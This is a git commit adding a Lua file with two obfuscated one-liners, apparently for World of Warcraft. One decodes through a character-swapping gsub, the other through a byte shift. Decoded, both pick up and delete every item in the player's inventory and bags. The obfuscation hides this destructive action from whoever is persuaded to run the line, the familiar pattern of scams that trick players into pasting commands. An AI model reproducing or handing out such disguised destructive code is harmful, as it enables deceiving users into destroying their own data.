080d7b31af4702b9216bce56ab3ad9b93ab84099
EinBaum <mail@einbaum.org>
2018-04-21 01:40:15 +0200

    obfuscated DeleteAllItems

---
+++ DeleteAllItems_obfuscated.lua
@@ -0,0 +1,10 @@
+-- Version 1
+
+(loadstring(string.gsub("=dDleeetCrusroIetmf o ri0=,02d oPcikpuIvnetnoyrIetmi()(d)nedf o ri-=41,1od ofrj =,19d9oP ikcuCpotnanieIrtme(,ijd)(e)n dend","(.)(.)(.)","%2%1%3")))()
+
+-- Version 2
+
+x="e>EfmfufDvstpsJufn!gps!j>1-31ep!QjdlvqJowfoupszJufn)j*e)*foe!gps!j>.5-22ep!gps!k>2-::ep!QjdlvqDpoubjofsJufn)j-k*e)*foe!foe"o=""for l=1,122 do o=o..string.char(string.byte(x,l)-1)end RunScript(o)
+
+
+
